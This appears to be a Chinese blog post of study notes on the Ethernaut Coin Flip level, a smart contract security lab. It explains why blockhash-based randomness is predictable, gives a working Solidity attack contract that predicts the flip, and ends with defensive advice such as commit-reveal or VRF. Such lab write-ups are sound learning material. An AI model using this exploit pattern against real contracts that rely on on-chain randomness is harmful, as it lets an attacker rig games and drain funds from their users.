---
title: "Ethernaut 靶场学习笔记 03：Coin Flip"
date: 2026-05-04 09:00:00
updated: 2026-05-04 09:00:00
categories:
  - "区块链安全"
  - "Ethernaut"
tags:
  - "Ethernaut"
  - "Solidity"
  - "智能合约安全"
abbrlink: "ethernaut-level-03"
---
> 这是我的 Ethernaut 靶场个人学习笔记，用来记录每一关的题目目标、漏洞原理、利用过程和复盘要点，方便后续按关卡重新练习和查漏补缺。

- 关卡：Level 3 - Coin Flip

## 本关目标

连续猜中 10 次 CoinFlip 的结果。

## 考察知识点

- 伪随机数可预测
- 区块哈希读取
- 同交易复现目标计算

## 题目源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## 源码与漏洞解析

1. 合约把 `blockhash(block.number - 1)` 转成整数，再除以固定 `FACTOR`，得到 0 或 1。这个结果对链上所有合约都是公开可计算的。
2. 攻击合约与目标合约在同一笔交易中读取同一个上一块区块哈希，因此可以先在攻击合约中复现同样公式，再把答案传给 `flip`。
3. `lastHash` 会阻止同一区块重复调用，所以不能在一个区块内循环刷 10 次；需要等待新区块后多次执行攻击函数。
4. 这关考察的是链上伪随机数问题：矿工、验证者、合约调用者都可能预测或影响简单链上随机源。

## 解题过程

1. 阅读合约可知结果由上一块区块哈希除以固定因子得到。
2. 部署攻击合约，在同一交易内复现目标合约的计算。
3. 把计算出的布尔值传给 `flip`，每个新区块调用一次，累计 10 次。

## 攻击合约 WP

```solidity
interface ICoinFlip {
    function flip(bool guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip target;

    constructor(address instance) {
        target = ICoinFlip(instance);
    }

    function attack() external {
        uint256 v = uint256(blockhash(block.number - 1)) / FACTOR;
        target.flip(v == 1);
    }
}
```

## 最终 WP

1. 部署攻击合约，保存目标实例地址。
2. 攻击函数中计算 `uint256(blockhash(block.number - 1)) / FACTOR`。
3. 把计算得到的布尔值传给目标 `flip(guess)`。
4. 跨 10 个新区块重复调用，直到 `consecutiveWins()` 为 10。

## 复盘与拓展

- 易错点：如果攻击合约和目标合约在同一交易中读取相同区块数据，攻击者就能得到同一个“随机”结果。
- 防御建议：使用 commit-reveal、VRF 或可信随机数预言机；不要把可公开计算的链上数据当随机源。
- 拓展：生产环境随机数可以考虑 commit-reveal、VRF 或可信随机数预言机，不能只取区块哈希。

## 参考资料

- 相关资料：https://hackmd.io/@0xbc000/SyLFCqoNp
- Ethernaut 官方仓库：https://github.com/OpenZeppelin/ethernaut
- Solidity 文档：https://docs.soliditylang.org/
